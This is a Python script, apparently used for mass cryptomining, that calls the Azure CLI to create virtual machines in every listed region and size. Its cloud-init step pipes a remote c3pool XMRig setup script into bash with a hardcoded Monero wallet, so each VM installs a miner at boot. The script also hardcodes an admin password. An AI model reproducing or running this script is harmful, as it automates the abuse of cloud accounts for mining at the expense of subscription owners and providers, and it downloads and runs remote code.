import io
import json
import time
from contextlib import redirect_stdout
from azure.cli.core import get_default_cli

# 初始化区域列表，共36个区域
locations = ['australiacentral', 'australiaeast', 'brazilsouth', 'canadacentral',
             'canadaeast', 'centralindia', 'centralus', 'eastasia', 'eastus', 'eastus2',
             'germanywestcentral', 'japaneast', 'japanwest', 'jioindiawest', 'koreacentral', 'koreasouth',
             'northcentralus', 'northeurope', 'norwayeast', 'southafricanorth', 'southcentralus',
             'southeastasia', 'southindia', 'swedencentral', 'switzerlandnorth', 'uaenorth', 'uksouth',
             'ukwest', 'westcentralus', 'westeurope', 'westindia', 'westus', 'westus2', 'westus3']

get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
                          '--location', 'eastus'])
# 除非订阅被禁用，其他任何情况下创建资源组都会成功（重名也返回成功）
print("创建资源组成功")

# 3.创建开机后要运行的脚本
init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 89hV6RLT8B7K8qSgHdayHg4uoAiqQL6XhYjmuMUgjHaBf7EGmC3h364hgJx3H6Gpgo5uf5q9V2D7cabT7QtYGku25mTvV2C"
with open("./cloud-init.txt", "w") as f:
    f.write("#cloud-config" + "\n")
    f.write("runcmd:" + "\n")
    f.write("  - sudo -s" + "\n")
    f.write(f"  - {init}")


vm_sizes = ['Standard_D4as_v4', 'Standard_D4as_v4', 'Standard_D2as_v4', 'Standard_D4s_v4', 'Standard_D4s_v4', 'Standard_D2s_v4', 'Standard_DC4s_v2', 'Standard_DC4s_v2', 'Standard_DC2s_v2']



count = 0

for vm_size in vm_sizes:
    for location in locations:
        count = count + 1
        print("正在 " + str(location) + " 区域创建" + f" {vm_size} 实例，为第 " + str(count) + " 个")
        get_default_cli().invoke(
            ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
             f'{location}-{vm_size}-{count}', '--image', 'UbuntuLTS',
             '--size', f'{vm_size}', '--location', f'{location}', '--admin-username',
             'azureuser', '--admin-password', 'a48CB83AB900A74268702AA2BCD349565', '--custom-data',
             'cloud-init.txt', "--no-wait"])


# 获取所有vm的名字
print("\n------------------------------------------------------------------------------\n")
print("大功告成！在31个区域创建虚拟机的命令已成功执行")
for i in range(120, -1, -1):
    print("\r正在等待Azure生成统计信息，还需等待{}秒".format(i), end="", flush=True)
    time.sleep(1)
print("\n------------------------------------------------------------------------------\n")
print("以下是已创建的虚拟机列表：")
get_default_cli().invoke(['vm', 'list', '--query', '[*].name'])
print("\n\n-----------------------------------------------------------------------------\n")
